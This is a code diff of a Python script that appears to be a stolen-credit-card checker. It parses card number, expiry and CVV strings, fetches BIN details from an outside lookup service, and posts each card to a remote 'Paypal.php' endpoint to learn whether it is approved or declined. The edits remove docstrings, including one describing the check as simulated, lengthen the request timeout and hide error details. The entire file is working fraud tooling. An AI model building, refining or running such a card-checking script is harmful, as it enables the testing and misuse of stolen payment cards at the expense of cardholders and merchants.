@@ -19,13 +19,11 @@ ANIMATION_DELAY = 0.5  # seconds
 
 
 def validate_card(card: str) -> bool:
-    """Validate card format"""
     pattern = r'^\d{12,19}\|\d{2}\|\d{4}\|\d{3,4}$'
     return bool(re.match(pattern, card))
 
 
 def get_bin_info(bin_code: str) -> dict:
-    """Fetch BIN info"""
     try:
         url = f"https://bins.antipublic.cc/bins/{bin_code}"
         response = requests.get(url, timeout=5)
@@ -43,19 +41,21 @@ def get_bin_info(bin_code: str) -> dict:
 
 
 def check_card(card: str) -> tuple:
-    """Simulate checking a card (or call real API)"""
     try:
         payload = {"lista": card}
-        response = requests.post("https://wizvenex.com/Paypal.php", data=payload, timeout=10)
+        response = requests.post("https://wizvenex.com/Paypal.php", data=payload, timeout=60)
         text = response.text.encode('utf-8', errors='replace').decode('utf-8')
+
         try:
             result = text.split('>')[1].split('<')[0].strip()
         except IndexError:
             result = text.strip()
+
         status = "Approved" if "approved" in result.lower() else "Declined"
         return True, status, result
-    except requests.RequestException as e:
-        return False, "Declined", f"API Error: {str(e)}"
+
+    except Exception:
+        return False, "Declined", "API Error: Something went wrong while checking the card."
 
 
 def format_response(card: str, status: str, response: str, bin_info: dict) -> str:
